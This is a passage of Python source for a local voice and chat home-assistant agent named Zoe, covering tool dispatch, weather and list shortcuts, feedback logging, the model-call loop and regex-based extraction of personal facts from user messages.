                "panel_navigate",
                {"url": url, "panel_id": panel_id, "_user_id": user_id},
            )
        except Exception as exc:
            return json.dumps({"error": f"open_touch_page_failed:{exc}"})

    if tool_name == "mempalace_search":
        results = await _mempalace_search(
            args.get("query", ""), user_id=user_id, limit=int(args.get("limit", 5))
        )
        if not results:
            return "No matching memories found."
        lines = []
        for r in results:
            content = r.get("text") or r.get("content") or r.get("summary") or str(r)
            lines.append(f"- {content[:300]}")
        return "\n".join(lines)

    if tool_name == "mempalace_add":
        ok = await _mempalace_add(
            summary=args.get("summary", ""),
            user_id=user_id,
            tags=args.get("tags"),
        )
        return "Memory stored." if ok else "Memory storage failed (MemPalace unavailable)."

    if tool_name == "ha_control":
        result = await _ha_control(
            entity_id=args.get("entity_id", ""),
            action=args.get("action", "toggle"),
            data=args.get("data"),
        )
        return json.dumps(result)

    if tool_name == "bash":
        return await _bash(args.get("command", ""))

    if tool_name == "memory_update":
        summary = args.get("summary", "")
        memory_type = args.get("memory_type", "fact")
        if not summary:
            return "No summary provided."
        ok = await _mempalace_add(
            summary=summary,
            user_id=user_id,
            tags=[memory_type],
        )
        return f"Memory stored: '{summary[:80]}'" if ok else "Memory storage failed."

    if tool_name == "web_search":
        return await _web_search_ddg(args.get("query", ""), user_id=user_id)

    if tool_name == "deep_web_research":
        return await _web_research(args.get("query", ""), user_id=user_id)

    if tool_name == "escalate_to_hermes":
        reason = args.get("reason", "complex task")
        task = args.get("task", "")
        return f"__ESCALATE_HERMES__:{reason}|{task}"

    if tool_name == "escalate_to_openclaw":
        reason = args.get("reason", "complex task")
        task = args.get("task", "")
        background = args.get("background", False)
        if background:
            return f"__ESCALATE_BG__:{reason}|{task}"
        return f"__ESCALATE__:{reason}|{task}"

    if tool_name == "show_map":
        payload = {
            "component": "map_embed",
            "props": {
                "title": args.get("title", "Map"),
                "markers": args.get("markers", []),
                "zoom": args.get("zoom", 13),
            },
        }
        return f"__UI__:{json.dumps(payload)}"

    if tool_name == "show_chart":
        payload = {
            "component": "chart",
            "props": {
                "chart_type": args.get("chart_type", "bar"),
                "title": args.get("title", ""),
                "labels": args.get("labels", []),
                "datasets": args.get("datasets", []),
            },
        }
        return f"__UI__:{json.dumps(payload)}"

    if tool_name == "show_action_menu":
        payload = {
            "component": "action_menu",
            "props": {
                "prompt": args.get("prompt", ""),
                "options": args.get("options", []),
            },
        }
        return f"__UI__:{json.dumps(payload)}"

    if tool_name == "setup_telegram":
        payload = {
            "component": "telegram_setup",
            "props": {},
        }
        return f"__UI__:{json.dumps(payload)}"

    if tool_name == "list_openclaw_plugins":
        try:
            async with httpx.AsyncClient(timeout=5) as client:
                base_url = _zoe_base_url()
                r = await client.get(f"{base_url}/api/openclaw/plugins")
                plugin_data = r.json() if r.status_code == 200 else {"plugins": []}
        except Exception:
            plugin_data = {"plugins": []}
        payload = {
            "component": "openclaw_manager",
            "props": plugin_data,
        }
        return f"__UI__:{json.dumps(payload)}"

    if tool_name == "list_openclaw_skills":
        try:
            async with httpx.AsyncClient(timeout=8) as client:
                base_url = _zoe_base_url()
                r = await client.get(f"{base_url}/api/openclaw/skills")
                skill_data = r.json() if r.status_code == 200 else {"skills": []}
        except Exception:
            skill_data = {"skills": []}
        highlight = args.get("highlight", "")
        payload = {
            "component": "skills_manager",
            "props": {**skill_data, "highlight": highlight},
        }
        return f"__UI__:{json.dumps(payload)}"

    if tool_name == "proactive_schedule":
        import datetime as _dt
        msg_text = (args.get("message") or "").strip()
        send_at_str = (args.get("send_at") or "").strip()
        if not msg_text or not send_at_str:
            return json.dumps({"error": "message and send_at are required"})
        try:
            from proactive.triggers.reminders import schedule_reminder
            send_at_dt = _dt.datetime.fromisoformat(send_at_str.replace("Z", "+00:00"))
            if send_at_dt <= _dt.datetime.now(_dt.timezone.utc):
                return json.dumps({"error": "send_at must be in the future"})
            scheduled_id = await schedule_reminder(
                user_id=user_id,
                message=msg_text,
                send_at=send_at_dt,
            )
            return json.dumps({"id": scheduled_id, "send_at": send_at_str, "status": "scheduled"})
        except Exception as _pe:
            return json.dumps({"error": f"proactive_schedule failed: {_pe}"})

    if tool_name == "report_issue":
        desc = (args.get("description") or "").strip()
        if not desc:
            return json.dumps({"error": "description is required"})
        try:
            from evolution_notice import record_user_issue  # type: ignore[import]
            await record_user_issue(message=desc, user_id=user_id)
        except Exception as _exc:
            logger.warning("report_issue tool: %s", _exc)
        return json.dumps({"status": "logged"})

    return f"[unknown tool: {tool_name}]"


# ── Voice capability recovery shortcut ───────────────────────────────────────

async def _voice_capability_shortcut(message: str, user_id: str) -> str | None:
    """Deterministic recovery when voice intent misses common weather asks.

    Keeps this narrow and cheap: only runs in voice mode and only for weather-
    phrasing where the LLM sometimes hallucinates "can't access weather".
    """
    msg = (message or "").lower()

    # Page-open asks that often slip through natural phrasing.
    if any(p in msg for p in ("open reminders", "show reminders", "reminders page", "go to reminders", "bring up reminders")):
        raw_nav = await _dispatch_tool("open_touch_page", {"page": "reminders"}, user_id=user_id)
        try:
            nav = json.loads(raw_nav)
            if isinstance(nav, dict) and nav.get("ok"):
                return "Opening the reminders page now."
        except Exception:
            pass
    if any(p in msg for p in ("open calendar", "show calendar", "calendar page", "go to calendar", "bring up calendar")):
        raw_nav = await _dispatch_tool("open_touch_page", {"page": "calendar"}, user_id=user_id)
        try:
            nav = json.loads(raw_nav)
            if isinstance(nav, dict) and nav.get("ok"):
                return "Opening the calendar now."
        except Exception:
            pass
    if any(p in msg for p in ("open list", "show list", "shopping page", "go to lists", "bring up shopping", "open lists")):
        raw_nav = await _dispatch_tool("open_touch_page", {"page": "lists"}, user_id=user_id)
        try:
            nav = json.loads(raw_nav)
            if isinstance(nav, dict) and nav.get("ok"):
                return "Opening your lists now."
        except Exception:
            pass

    weather_cues = ("weather", "rain", "forecast", "jacket", "umbrella", "temperature")
    if not any(c in msg for c in weather_cues):
        # List-add recovery for "buy/add/put" phrasing that missed intent routing.
        # "and X to the shopping list" is a common STT artifact for "add X to the shopping list".
        buy_match = re.search(
            r"(?:^|\b)(?:buy|get|add|put|stick|and)\s+(.+?)(?:\s+(?:to|on)\s+(?:the\s+|my\s+)?(?:shopping|grocery|groceries)?\s*list)?$",
            msg,
        ) if any(w in msg for w in ("shopping", "grocery", "groceries", "list")) else re.search(
            r"(?:^|\b)(?:buy|get|add|put|stick)\s+(.+?)(?:\s+(?:to|on)\s+(?:the\s+|my\s+)?(?:shopping|grocery|groceries)?\s*list)?$",
            msg,
        )
        if buy_match:
            item = buy_match.group(1).strip(" .,!?:;")
            # Strip "to the shopping list" suffix that gets captured when the trailing period
            # prevents the optional group in the regex from matching.
            item = re.sub(
                r"\s+(?:to|on)\s+(?:the\s+|my\s+)?(?:shopping|grocery|groceries)?\s*list$",
                "", item, flags=re.IGNORECASE,
            ).strip(" .,!?:;")
            if item and len(item) <= 120 and item not in {"it", "this", "that"}:
                raw_add = await _dispatch_tool(
                    "list_add_item",
                    {"list_type": "shopping", "text": item},
                    user_id=user_id,
                )
                try:
                    add_data = json.loads(raw_add)
                    if isinstance(add_data, dict) and not add_data.get("error"):
                        return f"Added {item} to your shopping list."
                except Exception:
                    pass

        # Reminder-create recovery for natural reminder wording that missed intent routing.
        rem_match = re.search(
            r"(?:remind me(?: to)?|set a reminder(?: to| for)?|reminder to)\s+(.+)$",
            msg,
        )
        if rem_match:
            title = rem_match.group(1).strip(" .,!?:;")
            if title and len(title) <= 160:
                raw_rem = await _dispatch_tool("reminder_create", {"title": title}, user_id=user_id)
                try:
                    rem_data = json.loads(raw_rem)
                    if isinstance(rem_data, dict) and not rem_data.get("error"):
                        return f"Okay, I set a reminder to {title}."
                except Exception:
                    pass
        return None

    wants_forecast = any(c in msg for c in ("tomorrow", "week", "forecast", "later"))
    tool_name = "weather_forecast" if wants_forecast else "weather_current"
    raw = await _dispatch_tool(tool_name, {"days": 3} if wants_forecast else {}, user_id=user_id)
    try:
        data = json.loads(raw)
    except Exception:
        return None
    if not isinstance(data, dict) or data.get("error"):
        return None

    response: str | None = None
    if wants_forecast and isinstance(data.get("forecast"), list) and data["forecast"]:
        first = data["forecast"][0]
        rain = float(first.get("precipitation_mm") or 0.0)
        desc = str(first.get("description") or "conditions")
        city = str(data.get("city") or "your area")
        if rain >= 0.5 or "rain" in desc.lower():
            response = f"Forecast for {city}: {desc.lower()}, with about {rain:.1f} millimetres of rain expected. Take an umbrella."
        else:
            response = f"Forecast for {city}: {desc.lower()}, with around {rain:.1f} millimetres of rain expected."
    elif data.get("temp") is not None:
        temp = float(data.get("temp"))
        feels = float(data.get("feels_like") or temp)
        desc = str(data.get("description") or "conditions")
        city = str(data.get("city") or "your area")
        if "jacket" in msg or "umbrella" in msg:
            advice = "A light jacket is a good idea." if feels <= 19 else "You should be fine without a jacket."
            response = f"It's {temp:.1f} degrees in {city}, feels like {feels:.1f}, with {desc.lower()}. {advice}"
        else:
            response = f"It's {temp:.1f} degrees in {city}, feels like {feels:.1f}, with {desc.lower()}."

    if response:
        asyncio.ensure_future(_log_feedback_triple(message, tool_name, raw, response, source="voice_shortcut"))
    return response


# ── Production feedback capture ─────────────────────────────────────────────

_FEEDBACK_PATH = os.path.expanduser("~/training/data/production-feedback.jsonl")
_FEEDBACK_LOCK = asyncio.Lock()


async def _log_feedback_triple(
    user_message: str,
    tool_name: str,
    tool_result: str,
    final_response: str,
    source: str = "shortcut",
) -> None:
    """Append an oracle-labeled (query → tool_call → result → response) triple.

    These are the highest-quality training examples because the shortcut provides
    a certain label — we KNOW the correct tool call. Logged in OpenAI function-calling
    format so they can be used directly in Phase 2 training without conversion.

    Non-blocking: failures are silently ignored so the user response is unaffected.
    """
    try:
        import datetime as _dt
        record = {
            "messages": [
                {
                    "role": "system",
                    "content": (
                        "You are Zoe, a warm home assistant. Be concise and natural. "
                        "Call tools when you need live data or to take an action."
                    ),
                },
                {"role": "user", "content": user_message},
                {
                    "role": "assistant",
                    "content": None,
                    "tool_calls": [{
                        "id": "call_0",
                        "type": "function",
                        "function": {
                            "name": tool_name,
                            "arguments": "{}",
                        },
                    }],
                },
                {"role": "tool", "tool_call_id": "call_0", "content": tool_result[:500]},
                {"role": "assistant", "content": final_response},
            ],
            "_format": "function_calling",
            "_tool": tool_name,
            "_source": source,
            "_ts": _dt.datetime.now().isoformat(),
        }
        async with _FEEDBACK_LOCK:
            os.makedirs(os.path.dirname(_FEEDBACK_PATH), exist_ok=True)
            with open(_FEEDBACK_PATH, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(record, ensure_ascii=False) + "\n")
    except Exception:
        pass  # never block the user response


# ── Chat capability recovery shortcut ────────────────────────────────────────

async def _chat_capability_shortcut(message: str, user_id: str) -> str | None:
    """Deterministic shortcut for chat-mode queries that sometimes bypass intent_router.

    Covers two failure modes of Gemma 4 E4B-QAT at temperature=0.6:

    1. Memory-recall questions ("do you remember X") where the model occasionally
       hallucinates "I don't have access to your memories" even when facts are loaded.
       If no memories are found we return a direct negative so the LLM never gets the
       chance to confabulate; if memories exist we return None and let the main path
       inject them into the user message as usual.

    2. Extended weather phrasings not caught by intent_router keyword matching in chat
       mode, e.g. "is it going to rain?" or "should I bring a jacket?". We call the
       weather tool directly and return a formatted answer.

    Returns a string answer to short-circuit the LLM path, or None to fall through.
    """
    msg = (message or "").lower()

    # ── Memory recall ─────────────────────────────────────────────────────────
    memory_recall_cues = (
        "do you remember", "what did i tell you", "recall when",
        "what do you know about me", "what have i told you", "what's in my memory",
        "what do you remember", "remind me what i said", "what did we discuss",
    )
    if any(c in msg for c in memory_recall_cues):
        facts = await _mempalace_load_user_facts(user_id)
        mem_ctx = await _build_memory_context(message, user_id=user_id)
        if facts.strip() or mem_ctx.strip():
            # Memories exist — return None so the main path injects them as context
            # and the LLM can interpret them in relation to the specific question.
            return None
        return "I don't have anything stored about that yet."

    # ── Extended weather phrasings ────────────────────────────────────────────
    chat_weather_cues = (
        "is it going to rain", "will it rain", "going to be hot", "going to be cold",
        "is it hot outside", "is it cold outside", "how hot is it", "how cold is it",
        "bring a jacket", "need a jacket", "bring an umbrella", "need an umbrella",
        "nice outside", "nice out today", "weather like today", "weather like outside",
        "is it sunny", "is it cloudy", "is it windy",
    )
    if not any(c in msg for c in chat_weather_cues):
        return None

    wants_forecast = any(c in msg for c in ("tomorrow", "week", "forecast", "later"))
    tool_name = "weather_forecast" if wants_forecast else "weather_current"
    raw = await _dispatch_tool(tool_name, {"days": 3} if wants_forecast else {}, user_id=user_id)
    try:
        data = json.loads(raw)
    except Exception:
        return None
    if not isinstance(data, dict) or data.get("error"):
        return None

    response: str | None = None
    if wants_forecast and isinstance(data.get("forecast"), list) and data["forecast"]:
        first = data["forecast"][0]
        rain = float(first.get("precipitation_mm") or 0.0)
        desc = str(first.get("description") or "conditions")
        city = str(data.get("city") or "your area")
        if rain >= 0.5 or "rain" in desc.lower():
            response = f"Forecast for {city}: {desc.lower()}, with about {rain:.1f} mm of rain expected. Bring an umbrella."
        else:
            response = f"Forecast for {city}: {desc.lower()}, with around {rain:.1f} mm of rain expected."
    elif data.get("temp") is not None:
        temp = float(data.get("temp"))
        feels = float(data.get("feels_like") or temp)
        desc = str(data.get("description") or "conditions")
        city = str(data.get("city") or "your area")
        if "jacket" in msg or "umbrella" in msg:
            advice = "A light jacket is a good idea." if feels <= 19 else "You should be fine without one."
            response = f"It's {temp:.1f}°C in {city} (feels like {feels:.1f}°C), {desc.lower()}. {advice}"
        else:
            response = f"It's {temp:.1f}°C in {city} (feels like {feels:.1f}°C), {desc.lower()}."

    if response:
        asyncio.ensure_future(_log_feedback_triple(message, tool_name, raw, response, source="chat_shortcut"))
    return response


# ── LLM call / KV warmup ─────────────────────────────────────────────────────

async def warmup_kv_cache() -> None:
    """Pre-process the system prompt so the KV cache is hot before the first user query.

    Without this, the first real query pays the full prefill cost (~500ms for the
    system prompt). After warmup, the prompt tokens are cached and subsequent queries
    only pay for their unique user message tokens (~1s vs ~2s for uncached first query).

    Called from the zoe-data startup lifespan event.
    """
    await asyncio.sleep(8)  # Give Gemma time to finish loading the 3.5GB model (~6s)
    # Use the stable system prompt (no datetime/user) so the KV cache prefix is
    # byte-identical to what real chat turns will see. This is the key fix —
    # previously the warmup used _ZOE_SOUL (with dynamic datetime) which invalidated
    # the cache on every real turn.
    for attempt in range(3):
        try:
            await _llm_call(
                [
                    {"role": "system", "content": _ZOE_SOUL_STATIC},
                    {"role": "user", "content": "ready"},
                ],
                max_tokens=3,
                temperature=0.0,
                use_tools=False,
            )
            logger.info(
                "zoe_agent: ✅ Gemma KV cache warmed (attempt %d) — first query will be fast",
                attempt + 1,
            )
            break
        except Exception as exc:
            logger.warning("zoe_agent: KV warmup attempt %d failed: %s — retrying in 5s", attempt + 1, exc)
            await asyncio.sleep(5)
    else:
        logger.warning("zoe_agent: KV warmup failed after 3 attempts (non-fatal — first query will be slower)")
        return

    # Warm the voice-mode prompt separately so voice commands are fast too
    try:
        await _llm_call(
            [
                {"role": "system", "content": _ZOE_SOUL_VOICE},
                {"role": "user", "content": "hi"},
            ],
            max_tokens=3,
            temperature=0.0,
            use_tools=False,
        )
        logger.info("zoe_agent: ✅ Gemma KV cache warmed (voice mode)")
    except Exception as exc:
        logger.debug("zoe_agent: voice KV warmup failed (non-fatal): %s", exc)


def _strip_thinking(text: str) -> str:
    """Remove Gemma 4 interleaved thinking tokens, keeping only the response."""
    # If model generates <|channel>thought...content...<|channel>response...answer
    # extract only the response part
    for marker in ("<|channel|>response", "<|channel>response", "</thought>", "<response>"):
        if marker in text:
            return text.split(marker, 1)[-1].strip()
    # Fallback: remove any <|...|> special-token-like blocks
    cleaned = re.sub(r"<\|[^|>]+\|?>?[^<]*", "", text)
    return cleaned.strip() or text.strip()


async def _llm_call(
    messages: list[dict],
    *,
    max_tokens: int = 256,
    temperature: float = 0.6,
    use_tools: bool = True,
    tools_override: list[dict] | None = None,
    tool_choice: str = "auto",
    timeout_s: float | None = None,
) -> tuple[str, str | None, dict | None]:
    """Make a non-streaming chat completion request to the local model.

    Returns:
        (text, tool_name, tool_args) — tool_name/args are None if no tool call.
        Uses the OpenAI tools API so tool calls come through delta.tool_calls,
        never through text content (prevents the ``` leak bug).
    """
    url = f"{_model_url()}/chat/completions"
    payload: dict = {
        "model": _model_name(),
        "messages": messages,
        "max_tokens": max_tokens,
        "temperature": temperature,
        "stream": False,
        "thinking_budget": 0,
    }
    if use_tools:
        payload["tools"] = tools_override if tools_override is not None else _TOOLS
        payload["tool_choice"] = tool_choice

    effective_timeout = timeout_s if timeout_s is not None else _llm_timeout_s(voice_mode=False)
    _t0 = time.monotonic()
    async with httpx.AsyncClient(timeout=effective_timeout) as client:
        r = await client.post(url, json=payload)
        r.raise_for_status()
    _latency_ms = int((time.monotonic() - _t0) * 1000)
    data = r.json()

    # Record LLM call (non-blocking best-effort)
    try:
        _usage = data.get("usage") or {}
        _prompt_tokens = _usage.get("prompt_tokens", 0)
        _completion_tokens = _usage.get("completion_tokens", 0)
        import asyncio as _asyncio, uuid as _uuid, time as _time
        async def _log_call():
            try:
                from db_pool import get_db_ctx as _get_pg_db
                async with _get_pg_db() as _db:
                    await _db.execute(
                        """INSERT INTO llm_call_log
                           (id, agent_tier, model, session_id, user_id,
                            latency_ms, prompt_tokens, completion_tokens, estimated_cost_usd, ts)
                           VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10)""",
                        _uuid.uuid4().hex, "zoe_agent", _model_name(),
                        None, "system",
                        _latency_ms, _prompt_tokens, _completion_tokens,
                        0.0,  # local LLM — always $0
                        _time.time(),
                    )
            except Exception:
                pass
        _asyncio.ensure_future(_log_call())
    except Exception:
        pass

    choice = data["choices"][0]["message"]

    # Check for tool call via the proper API channel (never leaks to text)
    tool_calls = choice.get("tool_calls") or []
    if tool_calls:
        tc = tool_calls[0]
        tool_name = tc.get("function", {}).get("name")
        raw_args = tc.get("function", {}).get("arguments", "{}")
        try:
            tool_args = json.loads(raw_args)
        except json.JSONDecodeError:
            tool_args = {"__parse_error": True, "__raw_args": raw_args[:200]}
        return "", tool_name, tool_args

    raw = choice.get("content") or ""
    return _strip_thinking(raw), None, None


# ── Main Zoe Agent entry point ────────────────────────────────────────────────

async def run_zoe_agent(
    message: str,
    session_id: str,
    user_id: str = "guest",
    *,
    history: list[dict] | None = None,
    db_memory_context: str | None = None,
    portrait: str | None = None,
    max_tokens_override: int = 0,
    voice_mode: bool = False,
) -> str:
    """
    Run the Zoe Agent loop for a single turn.

    Args:
        message:           The user's message.
        session_id:        Session identifier for logging.
        user_id:           Authenticated user id.
        history:           Optional prior messages for context window.
        db_memory_context: Pre-loaded approved memory facts (from MemoryService.load_for_prompt).
        portrait:          Pre-loaded user portrait text (from user_portrait.load_portrait).

    Returns:
        The final assistant response as a plain string.
    """
    t0 = time.monotonic()

    # Fast path: answer trivial queries instantly without LLM
    fast = _check_fast_response(message)
    if fast:
        logger.info("zoe_agent: fast response for session=%s in <1ms", session_id)
        return fast
    if voice_mode:
        recovered = await _voice_capability_shortcut(message, user_id)
        if recovered:
            logger.info("zoe_agent: capability shortcut hit session=%s", session_id)
            return recovered
    else:
        chat_recovered = await _chat_capability_shortcut(message, user_id)
        if chat_recovered:
            logger.info("zoe_agent: chat shortcut hit session=%s", session_id)
            return chat_recovered

    logger.info("zoe_agent: session=%s jetson=%s msg_len=%d voice=%s", session_id, _JETSON_MODE, len(message), voice_mode)

    # Load portrait (synthesized narrative understanding of the user)
    user_portrait = portrait if portrait is not None else await _load_user_portrait(user_id)

    # Load user facts, memory context, open loops, and context enhancement in parallel
    mp_facts, memory_ctx, user_open_loops, pending_offers, enhance_ctx = await asyncio.gather(
        _mempalace_load_user_facts(user_id),
        _build_memory_context(message, user_id=user_id),
        _load_open_loops(user_id),
        _load_pending_suggestions(user_id, session_id),
        _context_enhance(message, user_portrait, user_id),
    )
    memory_combined = "\n\n".join(filter(None, [mp_facts, db_memory_context, memory_ctx, enhance_ctx]))

    if voice_mode:
        # Voice: keep datetime+user in system prompt (voice has no history window, latency
        # budget is already tight — portrait goes into extras rather than the prompt header).
        extras = "\n\n".join(filter(None, [user_portrait, mp_facts, db_memory_context, memory_ctx, pending_offers]))
        system_prompt = (
            f"{_zoe_soul(user_id=user_id, voice_mode=True)}\n\n{extras}"
            if extras else _zoe_soul(user_id=user_id, voice_mode=True)
        )
        active_tools = _build_voice_tools(_voice_needs_tools(message))
        user_message = message
        _first_turn_choice = "auto"
    else:
        # Chat: stable system prompt (KV-cache friendly) + dynamic context in user prefix.
        # The system prompt is byte-identical every turn so llama.cpp can reuse the cache.
        # Portrait and memory go into the user message prefix via _build_prompt.
        system_prompt = _ZOE_SOUL_STATIC
        skills = _select_skills(message)
        active_tools = _build_tools(skills)
        user_message = _build_prompt(
            message,
            user_id=user_id,
            portrait=user_portrait,
            memory_context=memory_combined,
            open_loops=user_open_loops,
            pending_suggestions=pending_offers,
        )
        logger.info(
            "zoe_agent: skills=%s tools=%d/%d portrait=%d open_loops=%d",
            sorted(skills), len(active_tools), len(_TOOLS), len(user_portrait), len(user_open_loops),
        )
        # Use tool_choice="required" on the first turn when a real (non-discovery) skill
        # matched and the tool list is small: forces Gemma 4 E4B-QAT to call the tool rather
        # than answering in text when tool_choice="auto" lets it skip.
        _first_turn_choice = (
            "required"
            if (skills - {"discovery"} and len(active_tools) <= 6)
            else "auto"
        )

    # Build initial messages list with token-budget-aware compaction.
    # Gemma 4 E4B-QAT context window: 8192 tokens. Reserve ~2000 for the response.
    # Rough token estimate: len(text) / 4 (conservative for mixed content).
    _CTX_BUDGET = int(os.environ.get("ZOE_CONTEXT_TOKEN_BUDGET", "5500"))
    messages: list[dict] = [{"role": "system", "content": system_prompt}]
    if history:
        # Start from the most recent end, add messages until budget is reached.
        _sys_tokens = len(system_prompt) // 4 + len(user_message) // 4 + 50
        _remaining = _CTX_BUDGET - _sys_tokens
        trimmed: list[dict] = []
        for msg in reversed(history[-12:]):
            _msg_tokens = len(str(msg.get("content") or "")) // 4 + 10
            if _remaining - _msg_tokens < 0:
                logger.info(
                    "zoe_agent: context compaction triggered — dropped %d/%d history messages",
                    len(history[-12:]) - len(trimmed), len(history[-12:]),
                )
                break
            trimmed.insert(0, msg)
            _remaining -= _msg_tokens
        messages.extend(trimmed)
    messages.append({"role": "user", "content": user_message})

    # Empathy tone prefix — prepended to the LLM reply, no LLM cost
    _tone_prefix = _classify_tone(message) or ""

    # Tool loop — tool calls come through the API's tool_calls channel (never text)
    _max_iters = _VOICE_MAX_TOOL_ITERS if voice_mode else _MAX_TOOL_ITERS
    for iteration in range(_max_iters + 1):
        try:
            budget = max_tokens_override if max_tokens_override > 0 else (
                _voice_token_budget() if voice_mode else _token_budget(message)
            )
            # Always pass active_tools explicitly — prevents falling back to the full
            # _TOOLS list (bug fix: previously non-voice passed tools_override=None).
            # On iteration 0 with a real matched skill, use "required" to force the tool
            # call; subsequent iterations always use "auto" so the model can produce text.
            response_text, tool_name, tool_args = await _llm_call(
                messages,
                max_tokens=budget,
                tools_override=active_tools,
                tool_choice=_first_turn_choice if iteration == 0 else "auto",
                timeout_s=_llm_timeout_s(voice_mode=voice_mode),
            )
        except httpx.ConnectError:
            logger.error("zoe_agent: Gemma server unreachable at %s", _model_url())
            return (
                "I'm having trouble connecting to my local AI (Gemma). "
                "Please check that the inference server is running."
            )
        except Exception as exc:
            logger.exception("zoe_agent: LLM call failed (iter %d): %s", iteration, exc)
            return "Something went wrong — I couldn't generate a response. Please try again."

        if tool_name and iteration < _max_iters:
            # Detect parse error from _llm_call — inject error feedback instead of
            # running the tool with empty/wrong args so Gemma can self-correct.
            if tool_args and tool_args.get("__parse_error"):
                raw = tool_args.get("__raw_args", "")
                logger.warning(
                    "zoe_agent: iter=%d tool=%s args parse error, raw=%r",
                    iteration, tool_name, raw,
                )
                messages.append({
                    "role": "assistant",
                    "content": None,
                    "tool_calls": [{"id": f"call_{iteration}", "type": "function",
                                    "function": {"name": tool_name, "arguments": raw}}],
                })
                messages.append({
                    "role": "tool",
                    "tool_call_id": f"call_{iteration}",
                    "content": json.dumps({
                        "error": f"Invalid JSON arguments for '{tool_name}' — please retry with valid JSON.",
                        "raw_received": raw,
                    }),
                })
                continue

            logger.info(
                "zoe_agent: iter=%d tool=%s args=%s",
                iteration, tool_name, json.dumps(tool_args)[:120],
            )
            tool_result = await _dispatch_tool(tool_name, tool_args or {}, user_id=user_id)
            logger.debug("zoe_agent: tool_result=%s", tool_result[:200])

            # Escalation signal — return immediately for chat.py to handle.
            if tool_result.startswith(("__ESCALATE__:", "__ESCALATE_BG__:", "__ESCALATE_HERMES__:")):
                logger.info("zoe_agent: escalation triggered — %s", tool_result[:80])
                _fire_memory_capture(message, response_text, user_id=user_id)
                return tool_result

            # Append tool call + result in OpenAI tool_calls format for context
            messages.append({
                "role": "assistant",
                "content": None,
                "tool_calls": [{"id": f"call_{iteration}", "type": "function",
                                "function": {"name": tool_name, "arguments": json.dumps(tool_args or {})}}],
            })
            messages.append({
                "role": "tool",
                "tool_call_id": f"call_{iteration}",
                "content": _cap_tool_result(tool_name, tool_result),
            })
        else:
            # No tool call (or max iterations reached) — final response.
            # If the model returned a tool call on the final iteration, response_text
            # will be empty — surface an explicit step-limit message instead of silence.
            if not response_text and tool_name:
                response_text = (
                    "I've used all my steps on that — let me hand it off. "
                    "One moment while I escalate this for you."
                )
                logger.warning(
                    "zoe_agent: hit iter limit with pending tool=%s, returning step-limit message",
                    tool_name,
                )
            elapsed = time.monotonic() - t0
            logger.info(
                "zoe_agent: done session=%s iters=%d elapsed=%.1fs",
                session_id, iteration, elapsed,
            )
            _fire_memory_capture(message, response_text, user_id=user_id)
            return _tone_prefix + response_text

    return _tone_prefix + response_text


# User message patterns that will NEVER contain memorable personal facts
# Rule-based memory extraction patterns — pure Python, zero GPU cost.
# Replaces the _smart_memory_capture Gemma classifier to eliminate GPU contention
# on the next chat request. Modelled on what the Gemma classifier was catching,
# plus broader coverage for locations, relationships, ages, and identifiers.
_MEM_EXTRACT_PATTERNS: list[tuple[str, str]] = [
    # Explicit storage requests (always save verbatim)
    (r"(?:please\s+)?remember\s+(?:that\s+|this\s+)?(.{10,300})", "User asked to remember: {0}"),
    (r"don'?t\s+forget\s+(?:that\s+)?(.{10,200})", "Note: {0}"),
    (r"store\s+this[:\s]+(.{10,200})", "Stored fact: {0}"),
    # Personal identity
    (r"my\s+(?:full\s+)?name\s+is\s+(.{2,60})", "User's name is {0}"),
    (r"i(?:'m|\s+am)\s+(?:called|named|known\s+as)\s+([A-Za-z][A-Za-z\s]{1,40})", "User's name is {0}"),
    (r"call\s+me\s+([A-Za-z][A-Za-z\s]{1,30})", "User goes by: {0}"),
    # Birth / age
    (r"i\s+was\s+born\s+(?:on\s+)?(.{3,50})", "User was born on: {0}"),
    (r"my\s+(?:birthday|birth\s+date)\s+is\s+(.{3,40})", "User's birthday is {0}"),
    (r"i(?:'m|\s+am)\s+(\d{1,3})\s+years?\s+old", "User is {0} years old"),
    # Health / allergies
    (r"i(?:'m|\s+am)\s+allergic\s+to\s+(.{3,80})", "User is allergic to: {0}"),
    (r"i\s+have\s+(diabetes|asthma|coeliac|celiac|hypertension|[a-z]+\s+allergy)", "User has: {0}"),
    # Preferences
    (r"i\s+prefer\s+(.{3,80})\s+over\s+(.{3,80})", "User prefers {0} over {1}"),
    (r"i\s+(?:prefer|like|love|enjoy|adore)\s+(.{3,120})", "User prefers/likes: {0}"),
    (r"i\s+(?:don'?t\s+like|dislike|hate|can'?t\s+stand|detest)\s+(.{3,80})", "User dislikes: {0}"),
    (r"my\s+favou?rite\s+(?:\w+\s+)?is\s+(.{3,80})", "User's favourite: {0}"),
    # Family / relationships
    (r"my\s+(?:wife|husband|partner|girlfriend|boyfriend)'?s?\s+(?:name\s+)?is\s+(?:called\s+|named\s+)?([A-Za-z][A-Za-z\s]{1,40})", "User's partner is {0}"),
    (r"my\s+(?:son|daughter|kid|child)'?s?\s+(?:name\s+)?is\s+(?:called\s+|named\s+)?([A-Za-z][A-Za-z\s]{1,40})", "User's child is {0}"),
    (r"my\s+(?:dog|cat|pet)'?s?\s+(?:name\s+)?is\s+(?:called\s+|named\s+)?([A-Za-z][A-Za-z\s]{1,30})", "User's pet is called {0}"),
    (r"my\s+(?:mum|mom|dad|father|mother|brother|sister)'?s?\s+(?:name\s+)?is\s+(.{2,50})", "User's family member: {0}"),
    # Numbers / identifiers
    (r"my\s+(?:lucky\s+)?number\s+is\s+(\d+)", "User's lucky number is {0}"),
    # Location / work
    (r"i\s+live\s+in\s+(.{3,60})", "User lives in {0}"),
    (r"i\s+work\s+(?:at|for)\s+(.{3,80})", "User works at/for: {0}"),
    (r"i(?:'m|\s+am)\s+from\s+(.{3,60})", "User is from {0}"),
    (r"i\s+grew\s+up\s+in\s+(.{3,60})", "User grew up in {0}"),
    # Habits / routines
    (r"i\s+usually\s+(.{5,100})", "User's habit: {0}"),
    (r"i\s+always\s+(.{5,100})", "User always: {0}"),
    (r"every\s+(?:morning|evening|night|day|week)\s+i\s+(.{5,100})", "User's routine: {0}"),
]

_MEM_SKIP_PREFIXES = frozenset({
    "what is", "what are", "how do", "how does", "explain", "tell me about",
    "what time", "what day", "what date", "what year", "what month",
    "hello", "hi ", "hey", "good morning", "good night", "good evening",
    "thanks", "thank you", "ok", "okay", "never mind", "never",
    "tell me a joke", "write me", "can you write", "can you give me",
})


def _legacy_memory_extract(user_msg: str) -> list[str]:
    """Local fallback extractor if memory_extractor import fails.

    Keeps conversational memory capture alive even if the external helper module
    is missing or temporarily broken.
    """
    msg = (user_msg or "").strip()
    if not msg:
        return []
    lower = msg.lower()
